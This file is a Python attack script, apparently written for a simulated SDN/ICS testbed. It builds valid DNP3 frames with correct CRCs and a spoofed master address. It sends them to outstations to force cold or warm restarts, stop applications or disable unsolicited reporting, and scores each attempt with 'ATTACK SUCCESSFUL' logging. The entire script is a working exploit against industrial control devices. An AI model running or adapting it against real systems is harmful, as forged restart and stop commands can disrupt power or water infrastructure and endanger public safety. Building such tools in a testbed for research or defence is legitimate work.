#!/usr/bin/env python3
"""
Improved DNP3 Attack Script
Fixed based on diagnostic analysis and realistic success criteria
Updated for 24-host, 12-switch distributed SDN topology (h2-h24)
"""

import argparse
import logging
import sys
import time
import socket
import struct
from typing import Optional

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("DNP3_ATTACK")

class ImprovedDNP3Attacker:
    def __init__(self, victim_station: int, master_id: int = 1):
        self.victim_ip = f"10.0.0.{victim_station}"
        self.victim_port = 20000 + victim_station
        self.station_id = victim_station
        self.master_id = master_id  # Use master ID 1 based on actual system config
        
        logger.info(f"Target Station: {victim_station}")
        logger.info(f"Target Address: {self.victim_ip}:{self.victim_port}")
        logger.info(f"Master ID: {self.master_id}")
    
    def calculate_crc16(self, data: bytes) -> bytes:
        """Proper DNP3 CRC-16 calculation"""
        crc = 0x0000
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 0x0001:
                    crc = (crc >> 1) ^ 0xA001
                else:
                    crc >>= 1
        return struct.pack('<H', crc & 0xFFFF)
    
    def build_dnp3_packet(self, function_code: int) -> bytes:
        """Build DNP3 attack packet with proper addressing"""
        
        # Application Layer
        app_control = bytes([0xC0])    # FIR=1, FIN=1, CON=0, UNS=0, SEQ=0
        fc_byte = bytes([function_code])
        
        # Add parameters for specific function codes
        app_payload = b""
        if function_code in [13, 14]:  # Restart commands
            # Some implementations expect a delay parameter
            app_payload = bytes([0x00])  # No delay
        
        app_data = app_control + fc_byte + app_payload
        
        # Transport Layer
        transport = bytes([0xC0])  # FIR=1, FIN=1, SEQ=0
        user_data = transport + app_data
        
        # Data Link Layer Header
        control = bytes([0xC4])      # DIR=1, PRM=1, FCB=1, FCV=1, FUNC=4 (user data)
        dest = struct.pack('<H', self.station_id)  # Target outstation
        src = struct.pack('<H', self.master_id)    # Use consistent master ID
        
        # Calculate length
        length = len(user_data) + 5  # +5 for control + dest + src + header_crc
        
        # Build header for CRC calculation
        header_data = bytes([length]) + control + dest + src
        header_crc = self.calculate_crc16(header_data)
        
        # Calculate user data CRC
        data_crc = self.calculate_crc16(user_data)
        
        # Complete DNP3 packet
        start_bytes = bytes([0x05, 0x64])  # DNP3 start sequence
        packet = start_bytes + header_data + header_crc + user_data + data_crc
        
        return packet
    
    def test_connectivity(self) -> bool:
        """Test basic TCP connectivity"""
        try:
            logger.info("Testing connectivity...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            result = sock.connect_ex((self.victim_ip, self.victim_port))
            sock.close()
            
            if result == 0:
                logger.info("TCP connection successful")
                return True
            else:
                logger.error(f"TCP connection failed (error {result})")
                return False
                
        except Exception as e:
            logger.error(f"Connectivity test failed: {e}")
            return False
    
    def analyze_response(self, response: bytes, sent_fc: int) -> dict:
        """Improved response analysis with realistic success criteria"""
        result = {"success": False, "details": [], "confidence": 0}
        
        if len(response) < 10:
            result["details"].append(f"Response too short: {len(response)} bytes")
            return result
        
        try:
            # Find DNP3 start bytes
            start_pos = -1
            for i in range(len(response) - 1):
                if response[i] == 0x05 and response[i+1] == 0x64:
                    start_pos = i
                    break
            
            if start_pos == -1:
                result["details"].append("No DNP3 start bytes found")
                return result
            
            result["details"].append("Valid DNP3 frame received")
            result["confidence"] += 25
            
            # Parse data link layer
            if start_pos + 8 < len(response):
                length = response[start_pos + 2]
                control = response[start_pos + 3]
                dest = struct.unpack('<H', response[start_pos + 4:start_pos + 6])[0]
                src = struct.unpack('<H', response[start_pos + 6:start_pos + 8])[0]
                
                result["details"].append(f"DL: Length={length}, Control=0x{control:02x}")
                result["details"].append(f"Addresses: Src={src}, Dest={dest}")
                
                # Verify source is our target station
                if src == self.station_id:
                    result["confidence"] += 20
                    result["details"].append(f"Confirmed response from target station {src}")
                else:
                    result["details"].append(f"Warning: Response from station {src}, expected {self.station_id}")
                
                # Parse application data
                app_start = start_pos + 10  # Skip header + CRC
                if app_start + 3 < len(response):
                    transport_ctrl = response[app_start]
                    app_ctrl = response[app_start + 1]
                    resp_fc = response[app_start + 2]
                    
                    result["details"].append(f"App: Transport=0x{transport_ctrl:02x}, Control=0x{app_ctrl:02x}")
                    result["details"].append(f"Response Function Code: {resp_fc}")
                    result["confidence"] += 15
                    
                    # Realistic success determination based on function code and response
                    success_indicators = []
                    
                    if resp_fc == 129:  # Confirm response
                        success_indicators.append("Command confirmed (FC 129)")
                        result["confidence"] += 30
                        
                    elif resp_fc == 130:  # Unsolicited response
                        success_indicators.append("Unsolicited response received (FC 130)")
                        if sent_fc in [13, 14]:  # Restart commands often trigger unsolicited
                            success_indicators.append("Unsolicited response typical after restart")
                            result["confidence"] += 25
                        else:
                            result["confidence"] += 15
                    
                    # Check IIN if present
                    if app_start + 5 < len(response):
                        iin_bytes = response[app_start + 3:app_start + 5]
                        if len(iin_bytes) == 2:
                            iin = struct.unpack('<H', iin_bytes)[0]
                            result["details"].append(f"IIN: 0x{iin:04x}")
                            
                            # Check for any status indicators
                            if iin & 0x0002:  # Device restart
                                success_indicators.append("DEVICE RESTART bit set!")
                                result["confidence"] += 35
                            elif iin & 0x0080:  # Device trouble
                                success_indicators.append("Device trouble indicated")
                                result["confidence"] += 10
                            elif iin & 0x0040:  # Local control
                                success_indicators.append("Device in local control")
                                result["confidence"] += 5
                            elif iin == 0x0000:  # Normal status
                                success_indicators.append("Device reports normal status")
                                result["confidence"] += 10
                    
                    # Function code specific logic
                    if sent_fc == 13:  # Cold restart
                        if resp_fc in [129, 130]:
                            success_indicators.append("Cold restart command processed")
                            result["confidence"] += 20
                    elif sent_fc == 14:  # Warm restart
                        if resp_fc in [129, 130]:
                            success_indicators.append("Warm restart command processed")
                            result["confidence"] += 20
                    elif sent_fc == 18:  # Stop application
                        if resp_fc == 129:
                            success_indicators.append("Stop application confirmed")
                            result["confidence"] += 25
                    elif sent_fc == 21:  # Disable unsolicited
                        if resp_fc == 129:
                            success_indicators.append("Disable unsolicited confirmed")
                            result["confidence"] += 25
                    
                    # Add success indicators to details
                    for indicator in success_indicators:
                        result["details"].append(f"SUCCESS: {indicator}")
                    
                    # Determine overall success
                    if result["confidence"] >= 50:
                        result["success"] = True
                        result["details"].append(f"ATTACK SUCCESSFUL (confidence: {result['confidence']}%)")
                    elif result["confidence"] >= 30:
                        result["success"] = True  # Likely success
                        result["details"].append(f"LIKELY SUCCESSFUL (confidence: {result['confidence']}%)")
                    else:
                        result["details"].append(f"UNCERTAIN (confidence: {result['confidence']}%)")
        
        except Exception as e:
            result["details"].append(f"Parsing error: {e}")
        
        return result
    
    def execute_attack(self, function_code: int, count: int = 1, delay: float = 2.0) -> bool:
        """Execute attack with improved analysis"""
        
        fc_names = {
            13: "Cold Restart", 
            14: "Warm Restart", 
            18: "Stop Application", 
            21: "Disable Unsolicited"
        }
        
        logger.info("=" * 70)
        logger.info("IMPROVED DNP3 ATTACK EXECUTION")
        logger.info(f"Attack Type: {fc_names.get(function_code, f'Function Code {function_code}')}")
        logger.info(f"Target: Station {self.station_id} at {self.victim_ip}:{self.victim_port}")
        logger.info(f"Master ID: {self.master_id}")
        logger.info(f"Attempts: {count}, Delay: {delay}s")
        logger.info("=" * 70)
        
        # Test connectivity first
        if not self.test_connectivity():
            logger.error("Aborting attack due to connectivity issues")
            return False
        
        success_count = 0
        total_confidence = 0
        
        for attempt in range(count):
            logger.info(f"\n--- Attack Attempt {attempt + 1}/{count} ---")
            
            try:
                # Create connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10.0)
                sock.connect((self.victim_ip, self.victim_port))
                logger.info("TCP connection established")
                
                # Build and send attack packet
                packet = self.build_dnp3_packet(function_code)
                logger.info(f"Sending {len(packet)}-byte attack packet")
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug(f"Packet hex: {packet.hex()}")
                
                bytes_sent = sock.send(packet)
                logger.info(f"Sent {bytes_sent}/{len(packet)} bytes")
                
                # Wait for response
                try:
                    sock.settimeout(5.0)
                    response = sock.recv(1024)
                    
                    if response:
                        logger.info(f"Received {len(response)} byte response")
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug(f"Response hex: {response.hex()}")
                        
                        # Analyze response
                        analysis = self.analyze_response(response, function_code)
                        total_confidence += analysis["confidence"]
                        
                        for detail in analysis["details"]:
                            logger.info(f"  {detail}")
                        
                        if analysis["success"]:
                            success_count += 1
                            logger.info("ATTACK SUCCESSFUL!")
                        else:
                            logger.warning("Attack appears unsuccessful")
                    else:
                        logger.warning("No response received")
                        
                except socket.timeout:
                    logger.info("Response timeout")
                    # For some attacks, no response might be expected
                    if function_code in [18]:  # Stop application might not respond
                        success_count += 1
                        logger.info("Timeout may indicate successful stop command")
                
                sock.close()
                
            except Exception as e:
                logger.error(f"Attack attempt failed: {e}")
            
            # Delay between attempts
            if attempt < count - 1 and delay > 0:
                logger.info(f"Waiting {delay}s before next attempt...")
                time.sleep(delay)
        
        # Final summary
        avg_confidence = total_confidence / count if count > 0 else 0
        success_rate = (success_count / count) * 100 if count > 0 else 0
        
        logger.info("\n" + "=" * 70)
        logger.info("ATTACK CAMPAIGN SUMMARY")
        logger.info(f"Success Rate: {success_count}/{count} ({success_rate:.1f}%)")
        logger.info(f"Average Confidence: {avg_confidence:.1f}%")
        
        if success_count > 0:
            logger.info("MISSION ACCOMPLISHED - Attacks detected as successful")
        else:
            logger.warning("MISSION UNCERTAIN - No clear attack success detected")
        logger.info("=" * 70)
        
        return success_count > 0

def main():
    parser = argparse.ArgumentParser(description='Improved DNP3 Attack Script')
    parser.add_argument('--victim-station', type=int, required=True,
                       help='Target station ID (2-24)')                         # CHANGED: was (2-12)
    parser.add_argument('--fc', type=int, default=13, choices=[13, 14, 18, 21],
                       help='Function code (13=cold restart, 14=warm, 18=stop, 21=disable)')
    parser.add_argument('--count', type=int, default=1,
                       help='Number of attack attempts')
    parser.add_argument('--delay', type=float, default=2.0,
                       help='Delay between attempts (seconds)')
    parser.add_argument('--master-id', type=int, default=1,
                       help='Master station ID (default: 1, matches system config)')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Validate station ID — updated for 24-host topology (h2-h24)
    if not (2 <= args.victim_station <= 24):                                    # CHANGED: was <= 12
        logger.error("Invalid station ID. Use 2-24 (corresponding to h2-h24)") # CHANGED: was 2-12 / h2-h12
        sys.exit(1)
    
    try:
        attacker = ImprovedDNP3Attacker(args.victim_station, args.master_id)
        success = attacker.execute_attack(args.fc, args.count, args.delay)
        
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        logger.info("\nAttack interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
